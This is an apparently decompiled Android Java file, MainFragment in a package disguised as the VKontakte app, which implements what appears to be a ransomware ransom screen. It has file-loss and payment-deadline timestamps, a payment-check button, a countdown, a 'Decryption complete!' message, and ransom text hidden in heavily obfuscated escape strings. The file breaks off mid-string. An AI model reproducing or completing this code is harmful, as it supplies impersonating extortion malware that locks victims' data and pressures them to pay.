package com.android.vkontakte;

import android.annotation.SuppressLint;
import android.app.AlertDialog.Builder;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.graphics.Paint;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.os.Handler;
import android.os.Message;
import android.os.StrictMode;
import android.os.StrictMode.ThreadPolicy;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.media.TransportMediator;
import android.support.v7.recyclerview.BuildConfig;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import java.io.IOException;
import java.net.URL;
import java.net.URLConnection;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;

@SuppressLint("NewApi") public class MainFragment extends Fragment
	{
		ScrollView ScrollView;
		Button bt;
		TextView bt1;
		TextView bt2;
		TextView bt3;
		TextView bt4;
		EditText ed;
		Button fz;
		TextView je;
		TextView jed;
		TextView jr;
		TextView lx;
		TextView nr1;
		TextView nr2;
		TextView nr3;
		TextView nr4;
		TextView nr5;
		TextView sc;
		TextView scd;
		long timeStart;
		long fileLostTimeStamp;
		View view;
		long paymentRaisedTimeStamp;
		TextView wb;
		Button checkPaymentButton;
		TextView zfje;
		boolean 彼岸花;
		private Handler mHandler;

		public MainFragment ( )
			{
				mHandler = new Handler ( ) {
						@Override public void handleMessage ( Message message )
							{
								if ( message.what == 1279525738 && 彼岸花 )
									{
										彼岸花 = false;
										Toast.makeText ( getActivity ( ), "Расшифровка завершена!", Toast.LENGTH_LONG ).show ( );
										bt.setText ( "Расшифровка завершена" );
										ed.setText ( BuildConfig.VERSION_NAME );
									}
							}
					};
			}

		void ewm ( int i )
			{
				ImageView imageView = new ImageView ( getActivity ( ) );
				imageView.setImageResource ( i );
				new Builder ( getActivity ( ) ).setView ( imageView ).show ( );
			}

		@Override
		public View onCreateView ( LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle )
			{
				view = layoutInflater.inflate ( R.layout.main, viewGroup, false );
				StrictMode.setThreadPolicy ( new ThreadPolicy.Builder ( ).permitAll ( ).build ( ) );

				super.onCreate ( bundle );

				wb = view.findViewById ( R.id.wb );
				bt = view.findViewById ( R.id.bt );
				lx = view.findViewById ( R.id.lx );
				fz = view.findViewById ( R.id.fz );
				checkPaymentButton = view.findViewById ( R.id.check_payment_button );
				ed = view.findViewById ( R.id.ed );
				jr = view.findViewById ( R.id.jr );
				je = view.findViewById ( R.id.je );
				sc = view.findViewById ( R.id.sc );
				jed = view.findViewById ( R.id.jed );
				scd = view.findViewById ( R.id.scd );
				zfje = view.findViewById ( R.id.zfje );
				ScrollView = view.findViewById ( R.id.ScrollView );
				bt1 = view.findViewById ( R.id.bt1 );
				bt2 = view.findViewById ( R.id.bt2 );
				bt3 = view.findViewById ( R.id.bt3 );
				bt4 = view.findViewById ( R.id.bt4 );
				nr1 = view.findViewById ( R.id.nr1 );
				nr2 = view.findViewById ( R.id.nr2 );
				nr3 = view.findViewById ( R.id.nr3 );
				nr4 = view.findViewById ( R.id.nr4 );
				nr5 = view.findViewById ( R.id.nr5 );
				
				/*zfje.setText ( Utils.l (
								  "\u17d7\u1782\u17d1\u17db\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u17d4\u17d7\u1782\u17d1\u1795\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u1797\u17d7\u1782\u179a\u1796\u17e9\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1792\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u1795\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u17ae\u17d7\u1782\u17d1\u17a7\u17d7\u1782\u17d1\u1780\u17d7\u1782\u179a\u17c8\u17d7\u1782\u179a\u17db\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u17d0\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u17c8\u17d7\u1782\u179a\u1796\u17e9\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u1792\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u1797\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u17da\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u17da\u17e9\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u178a\u17d7\u1782\u17d1\u1786\u17e9" ) );
				bt1.setText ( Utils.l (
								 "\u17d4\u1793\u17a0\u17b1\u17d5\u17aa\u17d5\u17b4\u17d5\u17af\u1796\u1784\u17d6\u17b9\u17b4\u17a4\u17d6\u17b9\u1786\u17ac\u17d6\u17b9\u1782\u17aa\u17d6\u17a8\u1796\u17d3\u17d6\u17d4\u17a0\u17d3\u17d6\u17d5\u17b4\u17a5\u17d6\u1791\u1782\u17a8\u17d6\u17d5\u17b0\u1785\u17e9" ) );
				bt2.setText ( Utils.l (
								 "\u17d4\u1793\u17a0\u17b1\u17d6\u17d6\u17c8\u1781\u17d6\u17d4\u1792\u17d0\u17d6\u1791\u1782\u17a8\u17d6\u17d7\u17d1\u1797\u17d6\u17d4\u1792\u17a9\u17d6\u17b9\u1782\u17b5\u17d5\u17b9\u17ac\u17bb\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u17d4\u17a0\u17ab\u17d6\u17d6\u17d5\u1795\u17d6\u17d4\u17a0\u17ab\u17e9" ) );
				bt3.setText ( Utils.l (
								 "\u17d6\u17d6\u17c8\u1781\u17d6\u17d4\u1792\u17d0\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17e9" ) );
				bt4.setText ( Utils.l (
								 "\u17d6\u17a9\u17a0\u17a1\u17d6\u17d4\u1792\u17d0\u17d6\u1793\u17c8\u17d2\u17d5\u1782\u17d1\u1782\u17e9" ) );
				nr1.setText ( Utils.l (
								 "\u17d7\u1792\u179a\u17ae\u17d6\u17d7\u17d1\u1797\u17d6\u17d4\u1792\u17a9\u17d6\u17b9\u1782\u17b5\u17d5\u17b9\u17ac\u17bb\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d5\u1782\u17c8\u1799\u17d6\u17b9\u17b0\u17a7\u17d6\u17b9\u17b4\u17b1\u17d6\u17b9\u1782\u17aa\u17d6\u17d4\u17a4\u1791\u17d6\u1792\u17b0\u17d6\u17d6\u17aa\u178a\u178d\u17d5\u1782\u179a\u17b3\u17d6\u178c\u17a8\u17b9\u17d6\u17a9\u179a\u17cc\u17d4\u1793\u17a0\u17a0\u17d6\u17a8\u1782\u1795\u17e9\u17d6\u17d4\u17a0\u17a7\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17d6\u17d4\u17a0\u17ab\u17d6\u17d6\u17d5\u1795\u17d4\u1793\u17a0\u17a0\u17d5\u17ba\u17ac\u17b3\u17d6\u17b9\u17ac\u17b7\u17d6\u17d4\u178e\u1790\u17d6\u17d5\u17b0\u1785\u17d4\u1793\u17a0\u17a0\u17d6\u17d6\u17c8\u1781\u17d6\u17d4\u1792\u17d0\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17e9\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u17d5\u17b4\u1794\u17d6\u17d5\u17b4\u1794\u17d6\u17b9\u17b0\u17a6\u17d6\u1793\u17a4\u1785\u17d6\u17af\u17a0\u178e\u17d6\u17a8\u17ac\u178b\u17d6\u17aa\u178a\u1793\u17d6\u17d5\u17d5\u178e\u17d7\u1792\u179a\u17ae\u17d6\u17a8\u17b0\u178f\u17d6\u17a8\u17a0\u17d3\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u17b0\u17a6\u17d5\u17b9\u178a\u178e\u17d6\u17d4\u17a0\u178a\u17d6\u17d4\u17a0\u17ab\u17d6\u17af\u17a4\u17a1\u17e9\u17d6\u17d5\u17a4\u17b1\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17d5\u1782\u17b0\u178a\u17d6\u17b9\u17b0\u17ac\u17d6\u17af\u17d5\u17a0\u17d5\u17b9\u17ac\u17bb\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17a9\u17a0\u17ac\u17d6\u17d5\u17b4\u1787\u17d6\u17a9\u17b0\u17d1\u17d6\u17d7\u17a4\u1797\u17d5\u1782\u17c8\u1799\u17d6\u17b9\u17b0\u17a7\u17d6\u17d7\u17a4\u1792\u17d6\u17af\u1786\u1796\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u1782\u17aa\u17e9\u17d6\u17aa\u17ac\u17aa\u17d6\u17a8\u1782\u1796\u17d5\u17ba\u17d5\u178f\u17d5\u17a8\u17c8\u1799\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17d6\u1791\u1782\u17a8\u17d6\u17af\u17a8\u17a5\u17d6\u1793\u17d1\u17d2\u17d6\u17d4\u17a0\u17ab\u17d6\u17d5\u17b4\u17ac\u17d6\u17b9\u17b4\u17a2\u17d6\u17a8\u1796\u1796\u17d4\u1793\u17a0\u17a0\u17d6\u178c\u17a4\u17ab\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u17d1\u17e9\u17d7\u1782\u17d1\u17d5\u17d7\u1792\u179a\u17b3\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17d5\u17aa\u17d5\u1785\u17d5\u17ba\u1796\u17aa\u17d7\u1792\u179a\u17b3\u17d5\u17aa\u17d5\u1785\u17d5\u17af\u17ac\u17da\u17d7\u1792\u179a\u17b3\u17d6\u17a8\u17a0\u17af\u17d6\u1793\u17a0\u178d\u17d6\u17a8\u17a8\u17a5\u17d7\u1792\u179a\u17b3\u17d6\u17d7\u17d1\u1797\u17d6\u17d4\u1792\u17a9\u17d7\u1792\u179a\u17b3\u17d6\u1792\u17b4\u17a9\u17d6\u17af\u1786\u1794\u17e9\u17d7\u1792\u179a\u17b3\u17d6\u1792\u17b4\u17a9\u17d6\u1792\u178e\u1793\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17b9\u1782\u17aa\u17d6\u17aa\u17a4\u17b4\u17d6\u17b9\u17ac\u17b7\u17d6\u17aa\u17ac\u17aa\u17d6\u17a8\u1782\u1796\u17d6\u17d5\u17b0\u1785\u17d5\u17ba\u17d5\u178f\u17d6\u17b9\u1786\u17d7\u17d6\u17d4\u1792\u17a9\u17d5\u17ba\u1792\u17b3\u17d5\u17a8\u1796\u17a7\u17d6\u17b9\u1782\u17b5\u17d6\u17b9\u17b0\u17ac\u17d6\u1791\u1782\u17a8\u17e9\u17d6\u17d5\u17d5\u178e\u17e9" ) );
				nr2.setText ( Utils.l (
								 "\u17d7\u1792\u179a\u17ae\u17d6\u17b9\u1782\u17aa\u17d6\u17d7\u179a\u17d6\u17d6\u17b9\u17b4\u17a4\u17d6\u17d5\u179a\u17a2\u17d6\u17d6\u179a\u1782\u17d5\u17b9\u17ac\u1786\u17d6\u1791\u1782\u17a8\u17d6\u17d5\u17d5\u178e\u17d6\u1791\u17a0\u17a5\u17d5\u17ba\u1792\u17b3\u17d6\u17a9\u179a\u17cc\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u17a4\u1796\u17d6\u17a8\u17b0\u17c8\u17d5\u17b9\u17a4\u1784\u17d6\u17af\u179a\u178c\u17d5\u1782\u17c8\u1799\u17d4\u1793\u17a0\u17a0\u17e9\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d5\u17b9\u178a\u17d0\u17d6\u17a8\u178e\u17a7\u17d6\u17a8\u1782\u178e\u17d6\u17d6\u178a\u17d2\u17d6\u17d4\u17a0\u17ab\u17d6\u17b9\u17a0\u17b6\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u1782\u17d3\u17d6\u178c\u17b4\u17d6\u17d6\u1791\u1782\u17a8\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d5\u17af\u17d5\u17cc\u17d6\u17d6\u17d5\u1795\u17d6\u17b9\u17b0\u17a6\u17d6\u17b9\u1786\u1791\u17d6\u17a9\u17b4\u17d5\u17e9\u17d6\u17a8\u17a4\u17a6\u17d6\u17aa\u17ac\u17d0\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u17a4\u1796\u17d5\u17ba\u17ac\u17ab\u17d6\u17af\u17d1\u17a6\u17d6\u17b9\u1782\u17aa\u17d6\u17a9\u17ac\u17b4\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u1782\u17aa\u17d6\u17aa\u17ac\u17d0\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17b9\u1782\u17aa\u17d6\u17b9\u17b0\u17a7\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d5\u17b9\u17ac\u17b0\u17d6\u17d6\u179a\u17d1\u17e9\u17d6\u17b9\u17a0\u17b6\u17d6\u17a9\u179a\u17aa\u17d4\u1793\u17a0\u17a0\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u17a0\u1788\u17d6\u17a8\u1792\u17af\u17d6\u17b9\u17b4\u17a5\u17d6\u17d5\u1786\u17b0\u17d6\u178c\u178a\u179a\u17d6\u17b9\u17b0\u1788\u17d6\u17b9\u17b0\u17ac\u17d4\u1793\u17a0\u17a0\u17d6\u17d4\u17a0\u17ab\u17d5\u17b9\u17ac\u17b4\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17a8\u179a\u17a7\u17d6\u1793\u17ac\u17d2\u17e9\u17d6\u17b9\u17a0\u17b6\u17d6\u17a9\u179a\u17cc\u17d6\u1791\u178a\u178e\u17d5\u17b9\u178a\u17d0\u17d6\u17aa\u178a\u178d\u17d6\u17b9\u17b0\u17ab\u17d6\u17b9\u1782\u17aa\u17d5\u17b9\u17ac\u17a9\u17d4\u1793\u17a0\u17a0\u17d6\u1791\u178a\u178e\u17d5\u17b9\u178a\u17d0\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d6\u17a8\u1792\u17af\u17d6\u17b9\u17b4\u17a5\u17d6\u17aa\u178a\u178d\u17d7\u1782\u179a\u17da\u17d6\u17aa\u178e\u1799\u17d6\u17d4\u17a0\u17ac\u17e9\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17a8\u17b0\u178d\u17d6\u17b9\u17b0\u17a7\u17d6\u17b9\u17a4\u1796\u17d6\u17aa\u17ac\u17d0\u17d5\u17af\u178e\u179b\u17d5\u17b9\u1792\u17a6\u17d5\u17af\u1796\u17d5\u17d6\u17d4\u1796\u17d7\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d5\u17b9\u17ac\u17b1\u17d6\u17d5\u17a8\u178e\u17d4\u1793\u17a0\u17a0\u17d6\u17d4\u17b0\u178b\u17d6\u17b9\u17b0\u17a7\u17d6\u1792\u178a\u17d7\u17d6\u17a9\u17a4\u1787\u17e9\u17d4\u1793\u17a0\u17a0\u17d6\u17af\u179a\u17b9\u17d6\u1791\u1782\u17a8\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u17b9\u17a0\u17b6\u17d6\u17a9\u179a\u17cc\u17d4\u1793\u17a0\u17a0\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d5\u17aa\u17d5\u17b7\u17d5\u17a8\u1796\u1785\u17d6\u17aa\u17a8\u17b6\u17d6\u17af\u1786\u17d3\u17d6\u17b9\u1786\u1791\u17d6\u17a8\u17ac\u178b\u17d5\u17a8\u17c8\u1799\u17d6\u17d4\u1796\u17d7\u17d5\u17af\u1782\u17a1\u17e9\u17d6\u17af\u179a\u178c\u17d6\u17d4\u17b0\u178b\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u17a4\u1796\u17d5\u17aa\u1782\u17b9\u17d6\u17b9\u17a0\u17b6\u17d6\u17b9\u17b0\u17a7\u17d6\u1793\u1786\u17b7\u17d6\u17d4\u17b0\u178b\u17d6\u17d5\u17b0\u1785\u17d4\u1793\u17a0\u17a0\u17d6\u17a9\u17ac\u17ad\u17d6\u17d4\u178a\u1794\u17d6\u17d5\u17d5\u178e\u17d5\u17ba\u17ac\u17d6\u17d7\u1792\u179a\u17ae\u17d5\u17b9\u17ac\u17b1\u17e9\u17d6\u17d5\u17a8\u178e\u17d6\u1791\u1782\u17a8\u17d6\u17d4\u17a0\u17b1\u17d5\u17af\u17b4\u1786\u17d6\u17d4\u1796\u1796\u17d5\u1782\u17c8\u1799\u17d6\u17b9\u17b0\u17a7\u17d6\u17b9\u17b4\u17b1\u17d4\u1793\u17a0\u17a0\u17d6\u1791\u1782\u17a8\u17d5\u17b9\u178a\u17d0\u17d6\u17d4\u178a\u17d7\u17d6\u17d4\u17b0\u178b\u17d5\u17b9\u17ac\u17bb\u17d6\u17b9\u17a4\u17aa\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d6\u17a8\u1782\u1795\u17d6\u17d4\u17a0\u17a7\u17e9\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u1791\u1782\u17a8\u17d6\u17d4\u178e\u17a4\u17d6\u17d4\u17a0\u17ab\u17d6\u17a8\u178e\u178e\u17d6\u17aa\u17a8\u17ab\u17d6\u17b9\u17a8\u17b5\u17d6\u17d5\u17ac\u1786\u17d6\u17aa\u178a\u17b1\u17d5\u1782\u17c8\u1799\u17d4\u1793\u17a0\u17a0\u17d6\u17b9\u17ac\u17b7\u17d6\u17d5\u1786\u17af\u17d6\u17d7\u179a\u179a\u17d6\u17b9\u1782\u17d3\u17d6\u17b9\u1786\u1791\u17d6\u17d5\u17b0\u1785\u17d7\u1792\u179a\u17ae\u17e9\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d5\u1782\u17c8\u1799\u17d6\u17d5\u17b4\u17a7\u17d6\u17a8\u1782\u1795\u17d6\u17d4\u17a0\u17a7\u17d6\u17aa\u17ac\u17aa\u17d5\u17ba\u1796\u1797\u17d6\u1791\u1782\u17a8\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17d5\u17b9\u17ac\u17a9\u17d5\u17a8\u179a\u17b6\u17d5\u1782\u17c8\u1799\u17d6\u17a8\u17ac\u1788\u17d7\u1792\u179a\u17ae\u17d6\u17d6\u17c8\u1781\u17d6\u17d4\u1792\u17d0\u17d6\u1791\u1782\u17a8\u17e9\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u17a8\u17ac\u178b\u17d6\u17d4\u17a0\u17ab\u17d6\u1792\u178a\u17d7\u17d6\u17a9\u17a4\u1787\u17e9" ) );
				nr3.setText ( Utils.l (
								 "\u17d7\u1792\u179a\u17ae\u17d6\u17b9\u17a4\u17b0\u17d6\u17a9\u1796\u1791\u17d6\u17aa\u178a\u17a7\u17d6\u17d5\u17d1\u1790\u17d6\u17aa\u1796\u17a5\u17d6\u17a9\u17a0\u17ac\u17d6\u17a8\u17a4\u17da\u17d6\u178c\u1786\u17a5\u17d6\u17a8\u17ac\u178b\u17d4\u1793\u17a0\u17a0\u17d5\u17af\u17d5\u1784\u17d6\u17d5\u17a0\u17ab\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u17c8\u17d7\u1782\u17d1\u17d0\u17d7\u1782\u17d1\u17db\u17d7\u1782\u17d1\u1797\u17e9\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u17a8\u17d7\u1792\u179a\u17a4\u17d6\u17a8\u1796\u17d2\u17d6\u1792\u17d5\u17d0\u17d6\u17a8\u1792\u17a7\u17d4\u1793\u17a0\u17a0\u17d5\u17af\u17d5\u1791\u17d6\u17aa\u17ac\u17aa\u17d6\u17a8\u178e\u1791\u17d5\u17b9\u17a8\u1787\u17d5\u17a8\u1796\u17a0\u17d6\u17d7\u17d1\u17aa\u17d6\u17a8\u178e\u1791\u17d5\u17b9\u17a8\u1787\u17d6\u1791\u1782\u17a8\u17d5\u17a8\u17c8\u178e\u17d6\u17a9\u1782\u1781\u17d6\u17af\u17a0\u178e\u17e9\u17d4\u1793\u17a0\u17a0\u17d6\u17af\u179a\u17a2\u17d5\u17af\u17d5\u1784\u17d6\u17d5\u17a0\u17ab\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u17c8\u17d7\u1782\u17d1\u17d0\u17d7\u1782\u17d1\u17db\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u17a8\u17d7\u1792\u179a\u17a4\u17d6\u1792\u17a8\u17c8\u17d6\u17a8\u1796\u17d3\u17d5\u17a8\u17c8\u178e\u17d6\u17a9\u1782\u1781\u17d6\u17a9\u17a8\u17af\u17d6\u178c\u17a4\u17ab\u17e9\u17d4\u1793\u17a0\u17a0\u17d5\u17af\u17d5\u1791\u17d6\u17aa\u17ac\u17aa\u17d6\u17b9\u17b0\u17db\u17d6\u17b9\u17b0\u17ac\u17d6\u17b9\u17a4\u1796\u17d6\u1793\u1786\u17bb\u17d6\u17b9\u17a0\u17b6\u17d5\u1782\u179a\u17af\u17d6\u17b9\u17a4\u17b0\u17d4\u1793\u17a0\u17a0\u17d6\u17af\u179a\u17a2\u17d6\u17a8\u1782\u17b1\u17d6\u17d5\u17b0\u1786\u17d5\u17b9\u178a\u178c\u17d6\u17a8\u17b0\u17c8\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d5\u1782\u179a\u17af\u17e9\u17d6\u17b9\u17a4\u17b0\u17d6\u1793\u1786\u17bb\u17d5\u17a8\u179a\u17b3\u17d6\u17a8\u17ac\u1785\u17d6\u17af\u1786\u1794\u17d6\u17d5\u17b0\u1788\u17d6\u17a8\u17a4\u1781\u17d5\u17b9\u178a\u178c\u17d6\u17a8\u1782\u17b1\u17d6\u17d5\u17b0\u1786\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d6\u17af\u17d5\u17a0\u17d6\u17a8\u17ac\u17d6\u17d6\u17a8\u17b0\u17b9\u17d6\u17a9\u1782\u17a1\u17d6\u17d5\u1782\u17a6\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17da\u17e9\u17d7\u1782\u17d1\u1781\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u17ad\u17d7\u1792\u179a\u17a4\u17d6\u17a8\u1796\u17d2\u17d6\u1792\u17d5\u17d0\u17d6\u17a8\u1792\u17a7\u17d6\u17af\u179a\u17a2\u17d6\u17a8\u17ac\u17d6\u17d6\u17a8\u17b0\u17b9\u17d6\u17a9\u1782\u17a1\u17d6\u17aa\u178e\u1799\u17d6\u17a8\u17b0\u17d7\u17e9\u17d6\u17aa\u178a\u17a7\u17d5\u17af\u17d5\u1784\u17d6\u17d5\u17a0\u17ab\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17d0\u17d7\u1782\u17d1\u17c8\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u17ad\u17d7\u1792\u179a\u17a4\u17d6\u17a8\u1796\u17d2\u17d6\u1792\u17d5\u17d0\u17d5\u17ba\u17ac\u17d6\u17d6\u17af\u179a\u17a2\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d7\u1782\u179a\u17a6\u17d7\u1792\u179a\u17ae\u17d5\u17aa\u17d5\u17b7\u17d5\u17a8\u1796\u1785\u17e9\u17d6\u1791\u1782\u17a8\u17d6\u178c\u178a\u17d3\u17d6\u17d4\u17b0\u1794\u17d6\u17b9\u17b0\u17a6\u17d6\u17a8\u17ac\u1797\u17d6\u178c\u1782\u17b9\u17d6\u17af\u17a0\u178e\u17d6\u17b9\u1782\u17a2\u17d6\u17b9\u17a4\u17a2\u17d5\u1782\u17c8\u1799\u17d6\u17b9\u17b0\u17a7\u17d5\u17aa\u17d5\u17b7\u17d5\u17a8\u1796\u1785\u17d6\u17d7\u17a0\u1794\u17d6\u17b9\u1786\u17b4\u17d4\u1793\u17a0\u17b6\u17d6\u17d5\u178a\u17a1\u17d6\u17d6\u17c8\u178e\u17d5\u17ba\u1792\u17b3\u17e9\u17d7\u1782\u179a\u17a6\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d6\u17aa\u17a8\u17b7\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d7\u1792\u179a\u17b3\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d6\u17b9\u17ac\u1795\u17d6\u17a9\u17a8\u1784\u17d7\u1792\u179a\u17b3\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d7\u1782\u17d1\u1785\u17d7\u1782\u17d1\u1785\u17d6\u17d4\u17a0\u17ab\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17e9\u17d7\u1782\u179a\u17a6\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d6\u178c\u179a\u17b3\u17d6\u17d5\u17b4\u178f\u17d6\u17af\u1786\u1794\u17d6\u17d5\u17b0\u1788\u17d6\u17af\u179a\u17a2\u17d6\u1792\u178a\u17d7\u17d5\u17af\u17d5\u1784\u17d6\u17d5\u17a0\u17ab\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u1789\u17d7\u1782\u17d1\u17d0\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u1786\u17e9\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u178f\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u1791\u17d7\u1782\u17d1\u178e\u17d7\u1782\u17d1\u17ad\u17d7\u1792\u179a\u17a4\u17d6\u17a8\u1796\u17d2\u17d6\u1792\u17d5\u17d0\u17d5\u17ba\u17ac\u17d6\u17d7\u1782\u179a\u17a6\u17d6\u17b9\u1786\u17b4\u17d6\u17d4\u178a\u178b\u17d6\u178c\u179a\u17b3\u17d6\u1793\u1786\u17d5\u17d6\u17b9\u1782\u17a0\u17d6\u17d5\u17b4\u178f\u17d6\u17d5\u17a0\u17b3\u17d6\u17d4\u178a\u178b\u17e9\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17e9" ) );
				nr4.setText ( Utils.l (
								 "\u17d7\u1792\u179a\u17ae\u17d6\u17af\u179a\u1793\u17d6\u17d5\u17d1\u178b\u17d6\u17d6\u1792\u17a4\u17d6\u17b9\u1786\u178a\u17d6\u17d5\u17b0\u1785\u17d6\u1793\u1786\u17bb\u17d6\u17a8\u17ac\u1785\u17d4\u1793\u17a0\u17a0\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17da\u17d7\u1782\u17d1\u1781\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u178d\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u17a6\u17d7\u1792\u179a\u17a4\u17d5\u1782\u179a\u17af\u17e9\u17d6\u17d5\u17b0\u17ba\u17d7\u1792\u179a\u17ab\u17d7\u1782\u17d1\u17da\u17d7\u1782\u17d1\u1781\u17d7\u1782\u179a\u1796\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1797\u17d7\u1782\u17d1\u1795\u17d7\u1782\u17d1\u17d5\u17d7\u1782\u17d1\u1784\u17d7\u1782\u17d1\u178b\u17d7\u1782\u17d1\u17ad\u17d7\u1792\u179a\u17a4\u17d6\u17a8\u